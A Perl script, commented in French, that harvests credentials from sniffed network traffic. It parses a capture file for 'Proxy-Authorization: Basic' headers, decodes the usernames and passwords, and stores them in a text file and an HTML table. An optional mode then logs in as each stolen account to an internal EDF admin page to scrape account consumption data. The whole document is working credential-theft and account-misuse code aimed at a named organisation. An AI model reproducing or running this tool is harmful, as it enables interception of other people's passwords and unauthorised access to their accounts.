#/usr/bin/perl
#------------------------------------------------------------
# Script extraction mot de passe et generation page list
#------------------------------------------------------------
use strict;no strict "refs";
use LWP::UserAgent;
use HTTP::Cookies;
use HTTP::Headers;
use HTTP::Request;



#------------------------------------------------------------
# VARIABLES/CONSTANTES
#------------------------------------------------------------
use vars qw/
$FichierSnif $FichierPassword $FichierHtml
$sniffilecontent
%passwords %lastuse %note
$URL
$HTTPheader $HTTPua $HTTPresponse
$ActiveConso
/;
%passwords=(); %lastuse=(); %note=();


$URL="http://www-admin.der.edf.fr/admin/consom.php?COMPTE=";
$FichierSnif="";
$FichierPassword="d:/Mes developpements/acrack/passwordsedf.txt";
$FichierHtml="d:/Mes developpements/acrack/passwordsedf.html";
$ActiveConso=0;


#------------------------------------------------------------
# FUNCTIONS
#------------------------------------------------------------

#------------------------------------------------------------
# Decode a string coded in Base64
#------------------------------------------------------------
sub DecodeBase64 ($)
{
    local($^W) = 0; # unpack("u",...) gives bogus warning in 5.001m, 5.002beta2

    my $str = shift;
    my $res = "";

    $str =~ tr|A-Za-z0-9+/||cd;             # remove non-base64 chars (padding)
    $str =~ tr|A-Za-z0-9+/| -_|;            # convert to uuencoded format
    while ($str =~ /(.{1,60})/gs) {
        my $len = chr(32 + length($1)*3/4); # compute length byte
        $res .= unpack("u", $len . $1 );    # uudecode
    }
    $res;
}



#------------------------------------------------------------------------------
# Function:     Send a HTTP request and get HTML result
# Parameters:	URL string
# Return:		O Error, 1 OK, 2 Need a redirection
# Input var:	$HTTPheader $HTTPua
# Output var:	$HTTPresponse=Long string with all HTML code content
#------------------------------------------------------------------------------
sub RecupConso()
{
	my $url = shift; 
	my $request; my $response;

	# method=GET
	$request = HTTP::Request->new(GET => $url, $HTTPheader);
	$response = $HTTPua->request($request);

	# save result
	if ($response->is_error())
	{
		$response->error_as_HTML();
		$HTTPresponse=$response->status_line;
		return 0;
	}
	$HTTPresponse = $response->content();
	return 1;
}



#------------------------------------------------------------
# MAIN
#------------------------------------------------------------

# Get current time
my $nowtime=time;
my ($nowsec,$nowmin,$nowhour,$nowday,$nowmonth,$nowyear,$nowwday) = localtime($nowtime);
if ($nowyear < 100) { $nowyear+=2000; } else { $nowyear+=1900; }
my $nowsmallyear=$nowyear;$nowsmallyear =~ s/^..//;
if (++$nowmonth < 10) { $nowmonth = "0$nowmonth"; }
if ($nowday < 10) { $nowday = "0$nowday"; }
if ($nowhour < 10) { $nowhour = "0$nowhour"; }
if ($nowmin < 10) { $nowmin = "0$nowmin"; }
if ($nowsec < 10) { $nowsec = "0$nowsec"; }

if ($ARGV[0]=~/file=([^ &])/) 	{ $FichierSnif="$1"; }
if ($ARGV[0]=~/getconso/) 		{ $ActiveConso=1; }

my %monthlib = (1,"Jan",2,"Fev",3,"Mar",4,"Avr",5,"Mai",6,"Jui",7,"Jui",8,"Aou",9,"Sep",10,"Oct",11,"Nov",12,"Dec");

# Load password file
my $countoldpass=0;
if (-f $FichierPassword) {
	print "Read password file $FichierPassword\n";
	open(FICHIERPASSWORD, "<$FichierPassword") || die("Failed to open password file: $_");
	while(<FICHIERPASSWORD>) {
		chomp $_; $_ =~ s/\r//;
		my ($user,$password,$lastuse)=split(/\t+/,$_);
		if ($user) {
			$passwords{$user}="$password";
			$lastuse{$user}="$lastuse";
			$countoldpass++;
		}
	}
	close (FICHIERPASSWORD);
}
print $countoldpass." old passwords.\n";

# Load snif file
if ($FichierSnif) {
	print "Read snif file $FichierSnif\n";
	open(FICHIERSNIF, "<$FichierSnif") || die("Failed to open snif file $FichierSnif: $_");
	binmode FICHIERSNIF;
	while(<FICHIERSNIF>) {
		$sniffilecontent.=$_;
	}
	close (FICHIERSNIF);

	# Loop on snif content to update passwords and lastuse
	print "Analyze snif file content (".length($sniffilecontent)." bytes)\n";
	#print "$sniffilecontent\n";
	while ($sniffilecontent =~ /Proxy-Authorization: Basic\s([\=\w]+)/) {
		my $stringtodecode="$1";
		# Remove string found
		$sniffilecontent =~ s/Proxy-Authorization: Basic\s$stringtodecode//g;
	
		# We found a new coded string
		print "New basic string qualified: [$stringtodecode]\n";
		my $decodedstring=&DecodeBase64("$stringtodecode");
		print "Decoded string is $decodedstring\n";
		my ($newuser,$newpassword)=split(/:/,$decodedstring);
		my $newlastuse="$nowday/$nowmonth/$nowsmallyear $nowhour:$nowmin";
	
		# Save into arrays
		if ($newuser && $newuser =~ /.+\..+/) {
			$passwords{$newuser}=$newpassword;
			$lastuse{$newuser}=$newlastuse;
		}
	}
}

# Def of $HTTPheader $HTTPua
$HTTPua = LWP::UserAgent->new;
$HTTPua->agent($ENV{'HTTP_USER_AGENT'});

# Build password file and html file
print "Write database and html password file\n";
open(FICHIERPASSWORDTMP, ">$FichierPassword.tmp") || die("Failed to open password file $FichierPassword.tmp for write: $_");
open(FICHIERHTML, ">$FichierHtml") || die("Failed to open html file $FichierHtml for write: $_");
print FICHIERHTML "<html><head>";
print FICHIERHTML "<STYLE TYPE=\"text/css\"><!-- ";
print FICHIERHTML "BODY { font: 12px arial, verdana, helvetica, sans-serif;}\n";
print FICHIERHTML "TD { font: 12px arial, verdana, helvetica, sans-serif; text-align:center; }\n";
print FICHIERHTML "//--></STYLE>";
print FICHIERHTML "</head><body>\n";
print FICHIERHTML "<font color=blue>Comptes et mots de passe</font><br>\n";
print FICHIERHTML "Dernière mise à jour: ".localtime($nowtime)."<br><br>\n";

print FICHIERHTML "<table>\n";
print FICHIERHTML "<tr><td>Compte</td><td>Mot de passe</td><td>Derniere detection</td>";
foreach my $i (1..12) {
	print FICHIERHTML "<td>".$monthlib{$i}."</td>";
}
print FICHIERHTML "<td>Note</td>";
print FICHIERHTML "</tr>";

my $i=0;
foreach my $key (sort keys %passwords) {
	print "Sauvegarde compte $key\n";
	print FICHIERPASSWORDTMP "$key\t$passwords{$key}\t$lastuse{$key}\n";

	# Recup conso user
	my %conso=();
	if ($ActiveConso) {
		print "Recuperation conso $key par URL $URL$key\n";

		# Build extract string
		my $consoextractstring="<TH><P>$key</P></TH>";
		foreach my $i (1..12) {
			$consoextractstring.="<TD align=right><P>([\\s\\d\\.]*\)</P></TD>";
		}

		# Get page
		$HTTPheader = new HTTP::Headers;
		$HTTPheader->authorization_basic($key,$passwords{$key});
		my $ret=&RecupConso("$URL$key");

		if ($ret) {
			# Compare page with extract string
			$HTTPresponse =~ /$consoextractstring/i;
			foreach my $i (1..12) {
				$conso{$i}=$$i;
			}	
		}
		else {
			$note{$key}="Error: $HTTPresponse";
		}
	}

	# Output result
	print FICHIERHTML "<tr".(($i++ % 2)==0?" bgcolor=#EEEEEE":"")."><td>$key</td><td>$passwords{$key}</td><td>$lastuse{$key}</td>";
	foreach my $i (1..12) {
		print FICHIERHTML "<td>$conso{$i}</td>";
	}
	print FICHIERHTML "<td>$note{$key}</td>";
	print FICHIERHTML "</tr>\n";
}
print FICHIERHTML "</table>\n";
print FICHIERHTML "</body></html>\n";
close (FICHIERPASSWORDTMP);
close (FICHIERHTML);
rename("$FichierPassword.tmp", "$FichierPassword");


print "End of analyze\n";

0;

